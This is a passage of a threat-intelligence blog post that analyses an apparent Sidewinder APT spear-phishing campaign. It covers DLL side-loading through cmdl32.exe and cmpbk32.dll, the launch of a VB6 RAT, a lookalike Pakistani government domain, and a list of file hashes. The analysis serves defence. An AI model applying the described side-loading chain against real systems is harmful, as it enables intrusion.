cmpbk32.dll","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*NyF5UD6MIWldtbpEr3y5IQ.png":{"__typename":"ImageMetadata","id":"1*NyF5UD6MIWldtbpEr3y5IQ.png","originalHeight":162,"originalWidth":634,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_106":{"__typename":"Paragraph","id":"9376201130db_106","name":"8d19","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*NyF5UD6MIWldtbpEr3y5IQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_107":{"__typename":"Paragraph","id":"9376201130db_107","name":"f4e3","type":"P","href":null,"layout":null,"metadata":null,"text":"So when cmdl32.exe is launched cmpbk32.dll is loaded. (in the same directory, side loading)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_108":{"__typename":"Paragraph","id":"9376201130db_108","name":"18a6","type":"P","href":null,"layout":null,"metadata":null,"text":"the entrypoint is exectuted.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*fQ8cDP8CRj8EmmzfKMnXRw.png":{"__typename":"ImageMetadata","id":"1*fQ8cDP8CRj8EmmzfKMnXRw.png","originalHeight":856,"originalWidth":1114,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_109":{"__typename":"Paragraph","id":"9376201130db_109","name":"adf3","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*fQ8cDP8CRj8EmmzfKMnXRw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_110":{"__typename":"Paragraph","id":"9376201130db_110","name":"cce4","type":"P","href":null,"layout":null,"metadata":null,"text":"The important part is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*eSBQqIXyF-U2Qq51FYXsMg.png":{"__typename":"ImageMetadata","id":"1*eSBQqIXyF-U2Qq51FYXsMg.png","originalHeight":203,"originalWidth":850,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_111":{"__typename":"Paragraph","id":"9376201130db_111","name":"c042","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*eSBQqIXyF-U2Qq51FYXsMg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_112":{"__typename":"Paragraph","id":"9376201130db_112","name":"1fc1","type":"P","href":null,"layout":null,"metadata":null,"text":"The function sub.Winset.exe__0000000100001223_0 launches Winset.exe the real RAT like this “Winset.exe -0000000100001223” ; len=2","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*cyKfNUGcZs3qFmxqlZYEww.png":{"__typename":"ImageMetadata","id":"1*cyKfNUGcZs3qFmxqlZYEww.png","originalHeight":534,"originalWidth":1028,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_113":{"__typename":"Paragraph","id":"9376201130db_113","name":"170a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*cyKfNUGcZs3qFmxqlZYEww.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_114":{"__typename":"Paragraph","id":"9376201130db_114","name":"5f0d","type":"P","href":null,"layout":null,"metadata":null,"text":"Winset.exe is RAT developed in VB6.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_115":{"__typename":"Paragraph","id":"9376201130db_115","name":"0754","type":"P","href":null,"layout":null,"metadata":null,"text":"You can find an complete analysis here: https:\u002F\u002Fs.tencent.com\u002Fresearch\u002Freport\u002F479.html","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":40,"end":86,"href":"https:\u002F\u002Fs.tencent.com\u002Fresearch\u002Freport\u002F479.html","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_116":{"__typename":"Paragraph","id":"9376201130db_116","name":"9fab","type":"H3","href":null,"layout":null,"metadata":null,"text":"Threat Intelligence","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_117":{"__typename":"Paragraph","id":"9376201130db_117","name":"0e1b","type":"P","href":null,"layout":null,"metadata":null,"text":"We have the TTPs described in Tencent with the same phases.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_118":{"__typename":"Paragraph","id":"9376201130db_118","name":"5363","type":"P","href":null,"layout":null,"metadata":null,"text":"Sidewinder is a Indian Group targeting Pakistan military infrastructure.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_119":{"__typename":"Paragraph","id":"9376201130db_119","name":"0430","type":"P","href":null,"layout":null,"metadata":null,"text":"The content of the RTF is cleary oriented to Navy Pakistani.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_120":{"__typename":"Paragraph","id":"9376201130db_120","name":"fdad","type":"P","href":null,"layout":null,"metadata":null,"text":"If we check the infrastructure of the attackers:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*UNB3nsU-2fey_uCyR0BC4w.png":{"__typename":"ImageMetadata","id":"1*UNB3nsU-2fey_uCyR0BC4w.png","originalHeight":1054,"originalWidth":1024,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_121":{"__typename":"Paragraph","id":"9376201130db_121","name":"4a12","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*UNB3nsU-2fey_uCyR0BC4w.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_122":{"__typename":"Paragraph","id":"9376201130db_122","name":"366b","type":"P","href":null,"layout":null,"metadata":null,"text":"We have www.nadra.gov.pk.d-dns.co cleary targetted.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":8,"end":33,"href":"http:\u002F\u002Fwww.nadra.gov.pk.d-dns.co","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_123":{"__typename":"Paragraph","id":"9376201130db_123","name":"9348","type":"P","href":null,"layout":null,"metadata":null,"text":"The nadra is the National Database of and Registration Authority.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_124":{"__typename":"Paragraph","id":"9376201130db_124","name":"8c1a","type":"P","href":null,"layout":null,"metadata":null,"text":"If you check the metada of RTF, Rashid Memorial is the author of the document.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_125":{"__typename":"Paragraph","id":"9376201130db_125","name":"3030","type":"P","href":null,"layout":null,"metadata":null,"text":"This name is really known by the navy pakistani because “Rashid Memorial Welfare Organization (RMWO) was set up by a group of dedicated retired PAF officers in 1998 in memory of Flt. Lt. Rashid Ahmed Khan, who embraced ‘Shahadat’ on 13th December, 1997 when his aircraft caught fire above a densely populated area.”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_126":{"__typename":"Paragraph","id":"9376201130db_126","name":"b8d4","type":"H3","href":null,"layout":null,"metadata":null,"text":"IOCs","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_127":{"__typename":"Paragraph","id":"9376201130db_127","name":"0510","type":"P","href":null,"layout":null,"metadata":null,"text":"File RTF:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_128":{"__typename":"Paragraph","id":"9376201130db_128","name":"43cc","type":"P","href":null,"layout":null,"metadata":null,"text":"892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_129":{"__typename":"Paragraph","id":"9376201130db_129","name":"d710","type":"P","href":null,"layout":null,"metadata":null,"text":"08b9b5b7592004b8733544df1029e2fc085d82db1ba488a43830df49bbbc73b6","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_130":{"__typename":"Paragraph","id":"9376201130db_130","name":"e810","type":"P","href":null,"layout":null,"metadata":null,"text":"hta:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_131":{"__typename":"Paragraph","id":"9376201130db_131","name":"18d8","type":"P","href":null,"layout":null,"metadata":null,"text":"b8cbdb36ccd666adaf2ba3628cc79578d3a05119c71dce1bb16aa39e56dea3cc","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_132":{"__typename":"Paragraph","id":"9376201130db_132","name":"3cfe","type":"P","href":null,"layout":null,"metadata":null,"text":"Executables:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_133":{"__typename":"Paragraph","id":"9376201130db_133","name":"5ec7","type":"P","href":null,"layout":null,"metadata":null,"text":"8315956b587032db14ba4e700400dffeaeb4119ef509ecf0df1bb4e80a496b59 (cmpbk32.dll)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_134":{"__typename":"Paragraph","id":"9376201130db_134","name":"841f","type":"P","href":null,"layout":null,"metadata":null,"text":"13497aab3521abbaa654b51f375114e419b1bb774caa8c67cf52775095b17423 (winset.exe)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_135":{"__typename":"Paragraph","id":"9376201130db_135","name":"3b71","type":"P","href":null,"layout":null,"metadata":null,"text":"Sandbox execution:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_136":{"__typename":"Paragraph","id":"9376201130db_136","name":"4573","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488.rtf (MD5…\nInteractive malware hunting service. Any environments ready for live testing most type of threats. Without install…app.any.run","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":201,"href":"https:\u002F\u002Fapp.any.run\u002Ftasks\u002F779ba068-a9d5-490b-a1ec-7ebaa81e5d57","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":74,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":75,"end":190,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fapp.any.run\u002Ftasks\u002F779ba068-a9d5-490b-a1ec-7ebaa81e5d57","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*BQtQCP2DxBVQoBT6"}},"Paragraph:9376201130db_137":{"__typename":"Paragraph","id":"9376201130db_137","name":"e047","type":"H3","href":null,"layout":null,"metadata":null,"text":"Credits:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_138":{"__typename":"Paragraph","id":"9376201130db_138","name":"054f","type":"P","href":null,"layout":null,"metadata":null,"text":"Thanks to Benjamin Piot for exchange about this cases !","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"UserViewerEdge:userId:11d98531eebe-viewerId:lo_2dbf5aa1eba1":{"__typename":"UserViewerEdge","id":"userId:11d98531eebe-viewerId:lo_2dbf5aa1eba1","isMuting":false},"PostViewerEdge:postId:5bc1a7e7c84c-viewerId:lo_2dbf5aa1eba1":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:5bc1a7e7c84c-viewerId:lo_2dbf5aa1eba1"},"Tag:threat-intelligence":{"__typename":"Tag","id":"threat-intelligence","displayTitle":"Threat Intelligence","normalizedTagSlug":"threat-intelligence"},"Tag:malware-analysis":{"__typename":"Tag","id":"malware-analysis","displayTitle":"Malware Analysis","normalizedTagSlug":"malware-analysis"},"Post:5bc1a7e7c84c":{"__typename":"Post","id":"5bc1a7e7c84c","collection":null,"content({\"postMeteringOptions\":{\"referrer\":\"\"}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"6fa5","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"2ea6","startIndex":113,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:9376201130db_0"},{"__ref":"Paragraph:9376201130db_1"},{"__ref":"Paragraph:9376201130db_2"},{"__ref":"Paragraph:9376201130db_3"},{"__ref":"Paragraph:9376201130db_4"},{"__ref":"Paragraph:9376201130db_5"},{"__ref":"Paragraph:9376201130db_6"},{"__ref":"Paragraph:9376201130db_7"},{"__ref":"Paragraph:9376201130db_8"},{"__ref":"Paragraph:9376201130db_9"},{"__ref":"Paragraph:9376201130db_10"},{"__ref":"Paragraph:9376201130db_11"},{"__ref":"Paragraph:9376201130db_12"},{"__ref":"Paragraph:9376201130db_13"},{"__ref":"Paragraph:9376201130db_14"},{"__ref":"Paragraph:9376201130db_15"},{"__ref":"Paragraph:9376201130db_16"},{"__ref":"Paragraph:9376201130db_17"},{"__ref":"Paragraph:9376201130db_18"},{"__ref":"Paragraph:9376201130db_19"},{"__ref":"Paragraph:9376201130db_20"},{"__ref":"Paragraph:9376201130db_21"},{"__ref":"Paragraph:9376201130db_22"},{"__ref":"Paragraph:9376201130db_23"},{"__ref":"Paragraph:9376201130db_24"},{"__ref":"Paragraph:9376201130db_25"},{"__ref":"Paragraph:9376201130db_26"},{"__ref":"Paragraph:9376201130db_27"},{"__ref":"Paragraph:9376201130db_28"},{"__ref":"Paragraph:9376201130db_29"},{"__ref":"Paragraph:9376201130db_30"},{"__ref":"Paragraph:9376201130db_31"},{"__ref":"Paragraph:9376201130db_32"},{"__ref":"Paragraph:9376201130db_33"},{"__ref":"Paragraph:9376201130db_34"},{"__ref":"Paragraph:9376201130db_35"},{"__ref":"Paragraph:9376201130db_36"},{"__ref":"Paragraph:9376201130db_37"},{"__ref":"Paragraph:9376201130db_38"},{"__ref":"Paragraph:9376201130db_39"},{"__ref":"Paragraph:9376201130db_40"},{"__ref":"Paragraph:9376201130db_41"},{"__ref":"Paragraph:9376201130db_42"},{"__ref":"Paragraph:9376201130db_43"},{"__ref":"Paragraph:9376201130db_44"},{"__ref":"Paragraph:9376201130db_45"},{"__ref":"Paragraph:9376201130db_46"},{"__ref":"Paragraph:9376201130db_47"},{"__ref":"Paragraph:9376201130db_48"},{"__ref":"Paragraph:9376201130db_49"},{"__ref":"Paragraph:9376201130db_50"},{"__ref":"Paragraph:9376201130db_51"},{"__ref":"Paragraph:9376201130db_52"},{"__ref":"Paragraph:9376201130db_53"},{"__ref":"Paragraph:9376201130db_54"},{"__ref":"Paragraph:9376201130db_55"},{"__ref":"Paragraph:9376201130db_56"},{"__ref":"Paragraph:9376201130db_57"},{"__ref":"Paragraph:9376201130db_58"},{"__ref":"Paragraph:9376201130db_59"},{"__ref":"Paragraph:9376201130db_60"},{"__ref":"Paragraph:9376201130db_61"},{"__ref":"Paragraph:9376201130db_62"},{"__ref":"Paragraph:9376201130db_63"},{"__ref":"Paragraph:9376201130db_64"},{"__ref":"Paragraph:9376201130db_65"},{"__ref":"Paragraph:9376201130db_66"},{"__ref":"Paragraph:9376201130db_67"},{"__ref":"Paragraph:9376201130db_68"},{"__ref":"Paragraph:9376201130db_69"},{"__ref":"Paragraph:9376201130db_70"},{"__ref":"Paragraph:9376201130db_71"},{"__ref":"Paragraph:9376201130db_72"},{"__ref":"Paragraph:9376201130db_73"},{"__ref":"Paragraph:9376201130db_74"},{"__ref":"Paragraph:9376201130db_75"},{"__ref":"Paragraph:9376201130db_76"},{"__ref":"Paragraph:9376201130db_77"},{"__ref":"Paragraph:9376201130db_78"},{"__ref":"Paragraph:9376201130db_79"},{"__ref":"Paragraph:9376201130db_80"},{"__ref":"Paragraph:9376201130db_81"},{"__ref":"Paragraph:9376201130db_82"},{"__ref":"Paragraph:9376201130db_83"},{"__ref":"Paragraph:9376201130db_84"},{"__ref":"Paragraph:9376201130db_85"},{"__ref":"Paragraph:9376201130db_86"},{"__ref":"Paragraph:9376201130db_87"},{"__ref":"Paragraph:9376201130db_88"},{"__ref":"Paragraph:9376201130db_89"},{"__ref":"Paragraph:9376201130db_90"},{"__ref":"Paragraph:9376201130db_91"},{"__ref":"Paragraph:9376201130db_92"},{"__ref":"Paragraph:9376201130db_93"},{"__ref":"Paragraph:9376201130db_94"},{"__ref":"Paragraph:9376201130db_95"},{"__ref":"Paragraph:9376201130db_96"},{"__ref":"Paragraph:9376201130db_97"},{"__ref":"Paragraph:9376201130db_98"},{"__ref":"Paragraph:9376201130db_99"},{"__ref":"Paragraph:9376201130db_100"},{"__ref":"Paragraph:9376201130db_101"},{"__ref":"Paragraph:9376201130db_102"},{"__ref":"Paragraph:9376201130db_103"},{"__ref":"Paragraph:9376201130db_104"},{"__ref":"Paragraph:9376201130db_105"},{"__ref":"Paragraph:9376201130db_106"},{"__ref":"Paragraph:9376201130db_107"},{"__ref":"Paragraph:9376201130db_108"},{"__ref":"Paragraph:9376201130db_109"},{"__ref":"Paragraph:9376201130db_110"},{"__ref":"Paragraph:9376201130db_111"},{"__ref":"Paragraph:9376201130db_112"},{"__ref":"Paragraph:9376201130db_113"},{"__ref":"Paragraph:9376201130db_114"},{"__ref":"Paragraph:9376201130db_115"},{"__ref":"Paragraph:9376201130db_116"},{"__ref":"Paragraph:9376201130db_117"},{"__ref":"Paragraph:9376201130db_118"},{"__ref":"Paragraph:9376201130db_119"},{"__ref":"Paragraph:9376201130db_120"},{"__ref":"Paragraph:9376201130db_121"},{"__ref":"Paragraph:9376201130db_122"},{"__ref":"Paragraph:9376201130db_123"},{"__ref":"Paragraph:9376201130db_124"},{"__ref":"Paragraph:9376201130db_125"},{"__ref":"Paragraph:9376201130db_126"},{"__ref":"Paragraph:9376201130db_127"},{"__ref":"Paragraph:9376201130db_128"},{"__ref":"Paragraph:9376201130db_129"},{"__ref":"Paragraph:9376201130db_130"},{"__ref":"Paragraph:9376201130db_131"},{"__ref":"Paragraph:9376201130db_132"},{"__ref":"Paragraph:9376201130db_133"},{"__ref":"Paragraph:9376201130db_134"},{"__ref":"Paragraph:9376201130db_135"},{"__ref":"Paragraph:9376201130db_136"},{"__ref":"Paragraph:9376201130db_137"},{"__ref":"Paragraph:9376201130db_138"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:11d98531eebe"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"},{"__typename":"Topic","slug":"programming"}],"isLimitedState":false,"isPublished":true,"allowResponses":true,"responsesLocked":false,"visibility":"PUBLIC","latestPublishedVersion":"9376201130db","postResponses":{"__typename":"PostResponses","count":0},"responseDistribution":"NOT_DISTRIBUTED","clapCount":59,"title":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","isSeries":false,"sequence":null,"uniqueSlug":"apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1531839430410,"readingTime":6.379245283018868,"previewContent":{"__typename":"PreviewContent","subtitle":"Spear phishing"},"previewImage":{"__ref":"ImageMetadata:1*UNB3nsU-2fey_uCyR0BC4w.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1531774862686,"updatedAt":1531845392349,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:5bc1a7e7c84c-viewerId:lo_2dbf5aa1eba1"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:threat-intelligence"},{"__ref":"Tag:malware-analysis"}],"isFeaturedInPublishedPublication":false,"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":1346,"layerCake":4}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.6e32cc92.js"></script><script src="https://cdn-client.medium.com/lite/static/js/4164.63b05cfd.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.6ccbfced.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.5bef8967.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4505.6dfaf853.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9380.fb176dee.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.14632006.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.45f8fd10.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/803.b061c584.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4737.f07510eb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7381.7f2aa00a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6372.2eeebbff.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7938.607ab959.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3862.c8622812.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7915.cff63966.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4929.485ef991.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3623.7c96e20d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7979.15bcd496.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.de4e470a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.ba40f706.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8664.b06e2cc0.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4378.14d600be.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/144.54e8afc4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3666.cdb15b43.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8768.c294838b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1069.499eaa23.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3523.a6edc225.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3515.71934948.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.0d50902d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.0d800846.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.1770f8f5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.2bee425e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.55ad176a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.00cf71c8.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'927c51730888398c',t:'MTc0MzIxOTMzNi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"927c51730888398c","version":"2025.1.0","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>